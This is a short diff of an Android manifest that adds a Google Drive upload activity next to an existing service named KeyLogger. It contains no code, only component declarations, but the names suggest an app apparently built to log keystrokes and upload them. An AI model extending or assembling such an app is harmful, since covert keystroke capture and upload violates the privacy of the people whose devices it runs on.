@@ -119,6 +119,10 @@
             android:name=".FirstLaunchActivity"
             android:screenOrientation="portrait"
             android:theme="@style/AppTheme" />
+        <activity
+            android:name=".drive_upload.GoogleDrive"
+            android:screenOrientation="portrait"
+            android:theme="@style/AppTheme" />
 
         <service
             android:name=".services.KeyLogger"
